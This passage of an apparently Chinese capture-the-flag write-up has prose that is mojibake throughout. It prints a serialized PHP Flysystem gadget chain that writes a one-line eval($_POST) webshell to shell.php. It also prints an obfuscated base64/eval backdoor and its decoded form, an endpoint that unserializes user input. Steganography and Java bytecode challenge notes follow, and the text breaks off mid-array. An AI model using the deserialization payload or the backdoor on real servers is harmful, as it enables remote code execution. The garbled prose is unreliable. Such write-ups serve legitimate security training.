<code>O:39:&quot;League\Flysystem\Cached\Storage\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\Flysystem\Adapter\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;</code>ï¼Œ</p><p>è¯´æ˜é€šè¿‡ååºåˆ—åŒ–æ¼æ´å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æ‰¾åˆ°ä¸€é•¿ä¸²base64ç¼–ç å­—ç¬¦ä¸²ï¼Œè§£ç ä¿å­˜ä¸º <code>www.zip</code> æºç ï¼Œåœ¨ <code>app\controller\Index.php</code> ä¸­æ‰¾åˆ°æ··æ·†å¤„ç†è¿‡çš„é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> define(<span class="string">&#x27;IKlSux1227&#x27;</span>,<span class="keyword">__FILE__</span>);<span class="variable">$DusPFr</span>=base64_decode(<span class="string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;</span>);<span class="variable">$arCiCL</span>=<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$DusPFr</span>[<span class="number">6</span>].<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="variable">$VvUrBZ</span>=<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$DEomKk</span>=<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$DusPFr</span>[<span class="number">18</span>].<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$VvUrBZ</span>[<span class="number">1</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$LnpnvY</span>=<span class="variable">$DusPFr</span>[<span class="number">7</span>].<span class="variable">$DusPFr</span>[<span class="number">13</span>];<span class="variable">$arCiCL</span>.=<span class="variable">$DusPFr</span>[<span class="number">22</span>].<span class="variable">$DusPFr</span>[<span class="number">36</span>].<span class="variable">$DusPFr</span>[<span class="number">29</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>].<span class="variable">$DusPFr</span>[<span class="number">32</span>].<span class="variable">$DusPFr</span>[<span class="number">35</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="keyword">eval</span>(<span class="variable">$arCiCL</span>(<span class="string">&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°è¯•æ‰‹åŠ¨é€å±‚è§£å¯†ï¼Œæœ€åå¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">            unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C4zyC0m3On</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h3><p>zipå‹ç¼©åŒ…æ ¹æ®æç¤ºçˆ†ç ´6ä½æ•°å­—å¯†ç ä¸º <code>220101</code>ï¼Œè§£å‹æœ‰ <code>steg.pyc</code> å’Œ <code>flag.txt</code>ã€‚</p><p>ç”¨uncompyle6é€†pycå‘ç°æ— æœ‰æ„ä¹‰ä»£ç ï¼Œä¸ºpycéšå†™ï¼Œç”¨stegosauruså·¥å…·è§£å¯†ï¼š</p><p><code>python stegosaurus.py steg.pyc -x</code></p><p>å¾—åˆ°å¯†ç  <code>Extracted payload: TheKey:St3g1sV3ryFuNny</code>ã€‚</p><p>å†å°† <code>flag.txt</code> ä¸­emojiå¯†æ–‡ç”¨emoji-aesè§£å¾—åˆ°flagï¼š<code>cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</code></p><p>â€‹    </p><h3 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h3><blockquote><p>äºŒè¿›åˆ¶</p></blockquote><p>æ–‡ä»¶å¤´ <code>CAFEBABE</code> è¯´æ˜ä¸º <code>.class</code> Javaå­—èŠ‚ç æ–‡ä»¶ï¼Œç”¨jadxæŸ¥çœ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Main  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] strArr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr = &#123;<span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span 